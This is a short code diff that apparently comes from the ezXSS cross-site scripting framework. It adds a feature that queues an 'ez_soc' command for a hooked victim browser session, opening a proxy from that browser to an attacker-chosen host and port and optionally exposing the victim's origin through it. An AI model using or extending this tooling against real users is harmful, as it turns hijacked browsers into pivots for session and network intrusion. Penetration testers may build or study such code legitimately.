@@ -94,7 +94,22 @@ class Persistent extends Controller
                     $console = $this->model('Session')->getAllConsole($clientId, $origin);
                     return json_encode(['console' => $console]);
                 }
+
+                // Check if posted data is starting proxy
+                if ($this->getPostValue('proxy') !== null) {
+                    $ipport = $this->getPostValue('ipport');
+
+                    if (!preg_match('/^([\w.-]+):\d+$/', $ipport)) {
+                        throw new Exception('This does not look like a valid domain/IP with port');
+                    }
+
+                    $passOrigin = $this->getPostValue('passorigin') !== null ? '1' : '0';
+                    $this->model('Console')->add($clientId, $origin, "ez_soc('$ipport', $passOrigin)");
+                    throw new Exception("Proxy started on $ipport is accessible on http://$clientId.ezxss" . ($passOrigin === '1' ? " and http://$origin" : ''));
+                }
+
             } catch (Exception $e) {
+                $this->view->setContentType('text/html');
                 $this->view->renderMessage($e->getMessage());
             }
         }
